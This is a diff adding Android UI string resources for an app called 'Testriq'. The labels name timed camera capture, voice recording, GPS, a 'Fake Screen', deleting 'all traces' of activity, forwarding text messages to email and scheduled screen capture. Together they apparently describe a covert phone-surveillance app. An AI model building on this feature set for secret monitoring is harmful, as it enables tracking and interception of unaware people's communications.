@@ -1,0 +1,32 @@
+<resources>
+    <string name="app_name">Testriq</string>
+    <string name="edt_time">Enter Time in Seconds to Open Camera </string>
+    <string name="edt_qty"> Enter Photo Qty </string>
+    <string name="btn"> Click to Set </string>
+    <string name="record">Record</string>
+    <string name="play">Play</string>
+    <string name="list">List of recordings</string>
+    <string name="enterAudioName">Enter Audio Name</string>
+    <string name="pleaseEnterName">Name cannot be empty</string>
+    <string name="stop">Stop</string>
+    <string name="isRecording">Your voice is recording :</string>
+    <string name="goToList">Please go the list screen to play your recording</string>
+    <string name="done">Done</string>
+    <string name="voiceRecorder">Voice Recorder</string>
+    <!--    <string name="client_id">159467082572-c45asoau10ngj4biis3g78v3qqml6ap3.apps.googleusercontent.com</string>-->
+    <string name="client_id">757518959603-9dfkgs929e30f2eqotpp2lfkua815gqq.apps.googleusercontent.com</string>
+    <string name="setuploadtime">Set Upload Time</string>
+
+
+    <string name="audio_recording">Audio Recording</string>
+    <string name="camera">Camera</string>
+    <string name="gps">GPS</string>
+    <string name="fake_screen">Fake Screen</string>
+    <string name="delete_traces">Delete all traces of user-defined activity</string>
+    <string name="day_analyzer">Day Analyzer</string>
+    <string name="txt_message_forwarding">Text message forwarding to email </string>
+    <string name="screen_capture">Screen capture as per user-defined schedule</string>
+    <string name="activity_recorder">Activity Recorder</string>
+
+
+</resources>
